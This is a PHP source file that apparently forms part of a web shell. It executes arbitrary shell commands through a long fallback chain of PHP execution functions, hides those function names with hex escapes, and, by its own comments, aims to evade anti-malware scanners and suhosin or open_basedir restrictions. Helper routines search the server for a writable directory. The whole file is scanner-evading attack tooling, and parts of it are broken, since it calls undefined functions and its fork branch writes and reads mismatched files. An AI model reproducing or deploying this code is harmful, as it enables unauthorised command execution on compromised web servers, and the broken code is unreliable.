<?php

// thanks fuhosin
// most of the anti-malware-scanner-obfuscation has been removed

function fuhosin_exec($cmd)
{  
	$result = "";
	$cmd = "$cmd 2>&1";
	$ex3c = "\x65x\x65c"; 
	$sh3ll_ex3c = "sh\x65ll_$ex3c"; 
	$sy5t3m = "\x73yst\x65m";
	$p455thru = "p\x61\x73\x73th\x72u";
	$p0p3n = "\x70\x6fp\x65n";
	$pr0c_0p3n = "proc_op\x65n";
	$ffi = "ffi_$ex3c";
	$prl = "perl_$ex3c";
	$com = "com_$ex3c";
	$py = "python_\x65v\x61l";
	$pc = "pcntl_$ex3c";
	$sf = "suhosin_fun\x63_exi\x73ts";

	if (!empty($cmd))
	{
		if (func_exists($ex3c))
		{
			$ex3c($cmd,$result);
			$result = join("\n",$result);
		}
		elseif (func_exists($sh3ll_ex3c))
		{
			$result = $sh3ll_ex3c($cmd);
		}
		elseif (func_exists($sy5t3m))
		{
			@ob_start();
			$sy5t3m($cmd);
			$result = @ob_get_contents();
			@ob_end_clean();
		}
		elseif (func_exists($p455thru))
		{
			@ob_start();
			$p455thru($cmd);
			$result = @ob_get_contents();
			@ob_end_clean();
		}
		elseif (func_exists($p0p3n))
		{
			if (is_resource($fp = $p0p3n($cmd,"r")))
			{
				$result = "";
				while(!feof($fp))
				{
					$result .= fread($fp,1024);
				}
				pclose($fp);
			}
		}
		elseif (func_exists($pr0c_0p3n))
		{
			$descriptorspec = array( 0 => array("pipe","r"), 1 => array("pipe","w"), 2 => array("pipe","w"));
			$process = $pr0c_0p3n($cmd, $descriptorspec, $pipes, './');
			$result = stream_get_contents($pipes[1]);
			fclose($pipes[0]);
			fclose($pipes[1]);
			fclose($pipes[2]);
		}
		elseif(extension_loaded('python'))
		{
			$result = $py("import os; os.$sy5t3m('$cmd')");
		}
		elseif(extension_loaded('perl'))
		{
			$result = $prl($cmd);
		}
		elseif (func_exists("pcntl_$ex3c") && func_exists("pcntl_fork")) // UNLIKELY
		{
			$tmpdir = fuhosin_tmp_dir();
			$rstr = random_string();
			$pid = pcntl_fork(); // Fork
			if($pid == -1)
			{
				$result = ""; // failed to fork, result is blank, you lose. (GOOD DAY, SIR)
			}
			elseif($pid)
			{
				pcntl_wait($status);
				$result = file_get_contents("$tmpdir/$rstr");
				unlink("$tmpdir/$rstr");
			} // wait for output and return it
			else
			{
				$pc("/bin/\x73h", array("-c","$cmd > $tmpdir/fuhosin")); // exec
			}
		}
		elseif(extension_loaded('ffi'))
		{
			$result = $ffi($cmd); // Windows exec bypass, DOES NOT WORK ON PHP4!
		}
		elseif(class_exists("COM"))
		{
			$result = $com($cmd); // Windows exec bypass 2, DOES NOT WORK ON PHP4!
		}
	}

	return $result;
}

function fuhosin_tmp_dir()
{
	$tmp = sys_get_temp_dir();
	$uploadtmp = ini_get('upload_tmp_dir'); 
	$user_profile = getenv('USERPROFILE');
	$all_users_profile = getenv('ALLUSERSPROFILE');
	$save_path = ini_get('session.save_path');
	$envtmp = (getenv('TMP')) ? getenv('TMP') : getenv('TEMP');

	if(is_dir($tmp) && is_writable($tmp))
	{
		$ret = $tmp; // we prefer this over open_basedir shit
	}
	else if(is_dir('/tmp') && is_writable('/tmp'))
	{
		$ret = '/tmp';
	}
	else if(is_dir('/usr/tmp') && is_writable('/usr/tmp'))
	{
		$ret = '/usr/tmp';
	}
	else if(is_dir('/var/tmp') && is_writable('/var/tmp'))
	{
		$ret = '/var/tmp';
	}
	else if(is_dir($uploadtmp) && is_writable($uploadtmp))
	{
		$ret = $uploadtmp;
	}
	else if(is_dir($user_profile) && is_writable($user_profile))
	{
		$ret = $user_profile;
	}
	else if(is_dir($all_users_profile) && is_writable($all_users_profile))
	{
		$ret = $all_users_profile;
	}
	else if(is_dir($save_path) && is_writable($save_path))
	{
		$ret = $save_path;
	}
	else if(is_dir($envtmp) && is_writable($envtmp))
	{
		$ret = $envtmp;
	}
	else if(ini_get("open_b\x61sedir"))
	{
		$basedir_scan = fuhosin_scan_dir(ini_get("open_b\x61sedir"));

		if($basedir_scan)
		{
			$ret = $basedir_scan;
		}
	}
	else
	{
		$ret = '.';
	}
	
	return $ret;
}

function fuhosin_scan_dir($path = '.')
{
	// kungfu for open_basedir, recursively scan until we find a writable dir
	if(is_writable($path))
	{
		return $path;  // why did you even call this?!
	}

	$ignore = array('.', '..');
	$dh = @opendir($path);

	while(false !== ($file = readdir($dh)))
	{
		// make sure we arent backtracking
		if (!in_array($file, $ignore) && !is_dir("$path/$file") && is_writable("$path/$file"))
		{
			// fuck yeah we can write!
			closedir($dh); 
			return "$path/$file"; 
		}
		elseif(is_dir("$path/$file"))
		{ 
			return scan_dir("$path/$file"); 
		}
	}
	closedir($dh);
	return 0;
}

function random_string()
{
	$len = rand(3,6);
	$chr = '';
	for($i=1; $i<=$len; $i++)
	{
		$chr.=rand(0,1) ? chr(rand(65,90)) : chr(rand(97,122));
	}
	return $chr;
}
?>